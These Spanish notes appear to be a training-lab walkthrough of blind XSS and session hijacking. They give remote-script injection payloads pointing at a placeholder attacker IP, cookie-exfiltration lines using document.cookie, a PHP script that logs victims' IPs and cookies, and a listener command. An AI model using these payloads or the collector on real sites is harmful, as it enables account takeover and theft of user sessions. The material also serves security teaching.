
Las aplicaciones modernas usan cookies de sesion para mantener la sesion de un usuario a lo largo de diferentes sesiones. Esto le permite iniciar la sesion una vez y mantener la sesion activa incluso si visita el mismo sitio web en otro momento 

Con capacidad de ejecutar JS en el navegador de la victima podriamos ser capaces de obtener sus cookies y usarlas

## Deteccion de Blind XSS

Tratamos de buscar una vuln XSS pero en este caso es un Blind XSS. En esta lo que ocurre es que la vuln se activa en una pagina a la que no tenemos acceso

Suelen ocurrir con formularios que solo son accesibles para ciertos usuarios. Ejemplos:

- Formularios de contacto
- Reseñas
- Detalles de usuario
- Tickets de soporte
- Cabecera HTTP User-Agent

Vamos a /hijacking donde encontraremos un form de registro de usuario con varios campos. Primero lo rellenamos con campos de test:

![[Pasted image 20260717122252.png]]

Una vez enviado obtenemos el siguiente comentario:

Esto significa que no veremos como se maneja la entrada o como se ve el navegador ya que aparecera solo para el administrador en un panel de administracion al que no tenemos acceso

En estos casos no podemos ir probando cada campo con alert como hicimos antes. ¿Como lo detectamos?

Lo que haremos es como antes, poner un payload que se conecte a nuestro servidor y si se ejecuta lo veremos en nuestra linea de comandos

2 Problemas:
- Como sabemos que campo es el vulnerable
- Como sabemos que payload usar

## Cargando script remoto

Vamos a proporcionar un script remoto al payload:

```
<script src="http://IP/payload.js"></script> 
```


El payload estara en nuesta maquina atacante. Cambiaremos el nombre payload al del campo que estemos inyectando de modo que cuando recibamos la peticion sepamos identificar el campo

```
<script src="http://IP/username.js"></script> 
```

Si recibimos una peticion para username sabremos que username es el campo vuln o si es para name...


Con esto vamos probando payloads dentro del script remoto usando los payloads de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):

```
<script src=http://OUR_IP></script> 

'><script src=http://OUR_IP></script> 

"><script src=http://OUR_IP></script> 

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)') 

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script> 

<script>$.getScript("http://OUR_IP")</script>
```

## Secuestro de sesion

Una vez que encontramos el payload y campo que funciona procedemos a realizar el ataque de secuestro de sesion

Hay muchos payloads para obtener la cookie en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):

```
document.location='http://OUR_IP/index.php?c='+document.cookie; new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Usar cualquiera de los servira para que nos envie la cookie pero en este caso usaremos el segundo ya que es menos sospechoso que la primera que sube una imagen

![[Pasted image 20260717124333.png]]

Metemos el payload de las cookies dentro del archivo JS del campo vulnerable usando el payload que funciono:

![[Pasted image 20260717124410.png]]

Creamos un index.php en nuestra maquina local que dividira el valor de las cookies por si hay mas de una:

```
<?php if (isset($_GET['c'])) { $list = explode(";", $_GET['c']); foreach ($list as $key => $value) { $cookie = urldecode($value); $file = fopen("cookies.txt", "a+"); fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); fclose($file); } } ?>
```

(REMOTE_ADDR) --> pongo mi IP de Kali

Creamos el listener:

```
sudo php -S 0.0.0.0:80
```

Cuando la victima visite la pagina vulnerable y vea nuestro payload XSS recibiremos la peticion a nuestro script.js y las cookies:
